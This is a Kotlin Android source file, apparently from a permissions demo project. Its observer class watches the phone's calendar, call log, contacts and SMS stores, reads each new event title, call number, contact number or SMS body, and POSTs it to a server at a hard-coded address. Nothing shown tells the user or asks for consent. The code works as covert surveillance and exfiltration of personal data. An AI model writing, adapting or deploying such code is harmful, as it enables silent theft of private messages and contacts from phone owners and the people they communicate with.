package `in`.kaligotla.allpermissionsimpl.presentation.main.mainCommon

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.provider.CalendarContract
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import androidx.core.database.getStringOrNull
import com.google.gson.JsonObject
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST
import kotlin.random.Random

class MyObserver(private val context: Context, handler: Handler) : ContentObserver(handler) {
    private val uriList: List<Uri> = listOf(
        CalendarContract.Events.CONTENT_URI,
        CallLog.Calls.CONTENT_URI,
        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
        Telephony.Sms.CONTENT_URI,
    )
    private val contentResolver: ContentResolver = context.contentResolver
    private var cursor: Cursor? = null
    private val _newItem = MutableStateFlow<String?>(null)
    val newItem: StateFlow<String?> = _newItem.asStateFlow()

    @SuppressLint("Range")
    override fun onChange(selfChange: Boolean, uri: Uri?) {
        super.onChange(selfChange, uri)
        try {
            when {
                uri.toString().contains("com.android.calendar") -> {
                    cursor = context.contentResolver.query(CalendarContract.CONTENT_URI, null, null, null, "${CalendarContract.Events.DTSTART} asc")!!
                    while(cursor!!.moveToNext()) {
                        cursor!!.getStringOrNull(cursor!!.getColumnIndex(CalendarContract.Events.TITLE))?.let {
                            _newItem.value = "New Calendar event: $it"
                        }
                    }
//                    Log.e("new Calendar",""+newItem.value)
                }

                uri.toString().contains("call_log/calls") -> {
                    cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} asc")!!
                    while(cursor!!.moveToNext()) {
                        cursor?.getStringOrNull(cursor!!.getColumnIndex(CallLog.Calls.NUMBER))?.let {
                            _newItem.value = "New Call number: $it"
                        }
                    }
//                    Log.e("new Call",""+newItem.value)
                }

                uri.toString().contains("contacts") -> {
                    cursor = context.contentResolver.query(ContactsContract.Data.CONTENT_URI, null, null, null, "${ContactsContract.Data.CONTACT_LAST_UPDATED_TIMESTAMP} asc")!!
                    while(cursor!!.moveToNext()) {
                        cursor!!.getStringOrNull(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))?.let {
                            _newItem.value = "New Contact created: $it"
                        }
                    }
//                    Log.e("new Contact",""+newItem.value)
                }

                uri.toString().contains("sms") -> {
                    cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} asc")
                    while(cursor?.moveToNext()==true) {
                        cursor!!.getString(cursor!!.getColumnIndex(Telephony.Sms.BODY))?.let {
                            _newItem.value = "New SMS received: $it"
                        }
                    }
//                    Log.e("new SMS",""+newItem.value)
                }

                else -> {
                    Toast.makeText(context, "Invalid URI", Toast.LENGTH_SHORT).show()
                    Log.e("Invalid URI",""+uri)
                }
            }
        } catch (e: Exception) {
            Log.e("Exception",""+e)
        } finally {
            if(newItem.value!=null) {
                Retrofit.Builder()
                    .addConverterFactory(GsonConverterFactory.create())
                    .baseUrl("http://192.168.0.14:3000/")
                    .build()
                    .create(DBService::class.java)
                    .sendSMS(Android(generateRandom(10), Random.nextInt(1, 101), newItem.value))
                    .enqueue(object : Callback<JsonObject> {
                        override fun onResponse(call: Call<JsonObject>, response: Response<JsonObject>) {
                            Toast.makeText(context, ""+response.code(), Toast.LENGTH_SHORT).show()
                            Log.e("Response", ""+response)
                        }

                        override fun onFailure(call: Call<JsonObject>, t: Throwable) {
                            Log.e("Error", ""+call+t)
                        }
                    })
            }
            cursor?.close()
        }
    }

    fun registerObserver() {
        for(uri in uriList) {
            contentResolver.registerContentObserver(
                uri,
                true,
                this
            )
        }
        Log.e("Observer","Registered")
    }

    fun unregisterObserver() {
        contentResolver.unregisterContentObserver(this)
        Log.e("Observer","Unregistered")
    }

    fun generateRandom(length: Int): String {
        val charPool: List<Char> = ('a'..'z') + ('A'..'Z') + ('0'..'9') // Include characters you want
        return (1..length)
            .map { Random.nextInt(0, charPool.size) }
            .map(charPool::get)
            .joinToString("")
    }
}

data class Android(
    val username: String?,
    val androidId: Int,
    val androidData: String?
)

interface DBService {
    @POST("add_data")
    fun sendSMS(@Body body: Android): Call<JsonObject>
}